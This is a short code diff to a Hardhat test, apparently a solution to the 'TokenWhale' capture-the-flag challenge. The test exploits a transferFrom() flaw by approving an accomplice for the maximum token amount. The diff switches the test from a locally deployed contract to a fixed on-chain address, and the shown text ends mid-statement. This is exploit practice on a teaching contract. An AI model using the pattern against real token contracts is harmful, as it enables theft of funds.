@@ -3,16 +3,15 @@ import { ethers } from 'hardhat';
 
 describe('TokenSale', function () {
   it('should exploit the transferFrom()', async function () {
-    const [, player, accomplice] = await ethers.getSigners();
+    const [player, accomplice] = await ethers.getSigners();
+
+    const challengeAddress = '0x65750ca9A6C298a081029013e2A7020aeb45b11f';
 
     const Challenge = await ethers.getContractFactory('TokenWhale');
-    const challenge = await Challenge.deploy(player.address);
-    await challenge.deployed();
+    const challenge = Challenge.attach(challengeAddress);
 
     const tokens = ethers.BigNumber.from(2).pow(256).sub(1);
-    let tx = await challenge
-      .connect(player)
-      .approve(accomplice.address, tokens);
+    let tx = await challenge.approve(accomplice.address, tokens);
     await tx.wait();
 
     tx = await challenge
